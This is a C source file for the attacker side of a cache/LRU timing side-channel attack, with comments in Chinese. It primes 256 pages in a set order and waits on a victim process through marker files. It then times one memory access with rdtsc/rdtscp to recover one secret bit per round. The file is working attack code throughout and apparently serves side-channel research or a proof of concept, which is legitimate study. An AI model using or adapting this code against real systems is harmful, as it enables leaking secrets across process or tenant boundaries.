#include <stdio.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

#define XPT_SIZE 256
#define L1_L2_EVICT (512 * 1024)

uint8_t attacker_mem[1024 * 4096] __attribute__((aligned(4096)));
uint8_t l1_evict_set[L1_L2_EVICT] __attribute__((aligned(4096)));

int main() {
    volatile uint8_t junk;
    
    // 初始化
    memset(attacker_mem, 0, sizeof(attacker_mem));
    memset(l1_evict_set, 1, sizeof(l1_evict_set));

    printf("[Attacker] LRU Targeted Attack: 256 Prime -> 1 Victim Evict -> 1 Probe.\n");

    for (int bit = 0; bit < 8; bit++) {
        unlink("prime_done");
        while (access("victim_done", F_OK) == 0) unlink("victim_done");

        // --- Step 1: 精准顺序训练 ---
        // 严格按 0 到 255 的顺序访问，确保 Page 0 成为 LRU 链表中最老的一项
        for (int p = 0; p < XPT_SIZE; p++) {
            // 每个页面写多次以确保 ENABLED，但顺序必须是 p 从 0 到 255
            for (int i = 0; i < 40; i++) 
                attacker_mem[p * 4096] = (uint8_t)i;
        }

        // --- Step 2: 同步 (严禁访问任何 attacker_mem 页面) ---
        close(open("prime_done", O_CREAT | O_RDWR, 0666));
        while (access("victim_done", F_OK) == -1) {
            // 简单的 busy wait 循环，不涉及大量访存
            for (volatile int i = 0; i < 1000; i++); 
        }

        // --- Step 3: 探测 (Probe) ---
        // 扫除 L1/L2 干扰
        for (int i = 0; i < L1_L2_EVICT; i += 64) junk = l1_evict_set[i];
        __asm__ volatile("mfence");

        uint32_t lo, hi;
        __asm__ volatile ("rdtsc" : "=a" (lo), "=d" (hi));
        uint64_t start = ((uint64_t)hi << 32) | lo;

        junk = attacker_mem[0]; // 目标：Page 0

        __asm__ volatile ("rdtscp" : "=a" (lo), "=d" (hi)); // 用 rdtscp 强制顺序执行
        uint64_t end = ((uint64_t)hi << 32) | lo;
        uint32_t latency = (uint32_t)(end - start);

        printf("[Result] Bit %d: Latency %u -> %s\n", bit, latency, (latency > 150) ? "GUESS 1 (EVICTED)" : "GUESS 0 (HIT)");
        fflush(stdout);

        // --- Step 4: 冷却 (清理 XPT) ---
        for (int p = 512; p < 512 + 256; p++) attacker_mem[p * 4096] = 0xff;
    }
    return 0;
}